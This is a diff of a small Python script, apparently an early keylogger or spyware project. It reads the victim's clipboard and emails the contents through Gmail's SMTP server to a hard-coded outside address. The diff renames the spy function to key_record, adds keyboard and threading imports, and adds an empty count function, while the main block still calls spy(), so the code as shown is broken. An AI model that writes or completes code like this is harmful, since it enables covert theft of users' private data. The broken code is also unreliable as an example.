@@ -1,8 +1,10 @@
 import pyperclip
 import smtplib
 import keyboard
+import time
+import threading
 
-def spy():
+def key_record():
 
 	data = pyperclip.paste().encode("utf-8") #.decode('utf-8')
 	server = smtplib.SMTP('smtp.gmail.com', 587)
@@ -22,6 +24,11 @@ def spy():
 			"jacksonsoftwaresolutions@gmail.com", data)
 
 	server.close()
+
+def count():
+
+
+
 
 if __name__=="__main__":
 	spy()
